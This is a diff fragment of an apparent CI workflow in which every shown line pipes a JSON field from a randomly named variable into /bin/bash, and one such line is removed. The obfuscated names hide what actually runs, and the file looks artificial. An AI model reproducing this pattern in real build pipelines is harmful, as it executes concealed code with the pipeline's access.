@@ -25,7 +25,6 @@ jobs:
           echo $fmrnc22923 | jq -r .vzx516 | /bin/bash
           printf '%s' "$gtg40" | jq -r .uklcl0 | /bin/bash
           printf '%s' "$hm405" | jq -r .x8 | /bin/bash
-          printf '%s' "$xrb0004" | jq -r .opym56654 | /bin/bash
           echo $j3 | jq -r .jcvhn28 | /bin/bash
           printf '%s' "$juv20904" | jq -r .r99 | /bin/bash
           echo $khcd9509 | jq -r .t86 | /bin/bash
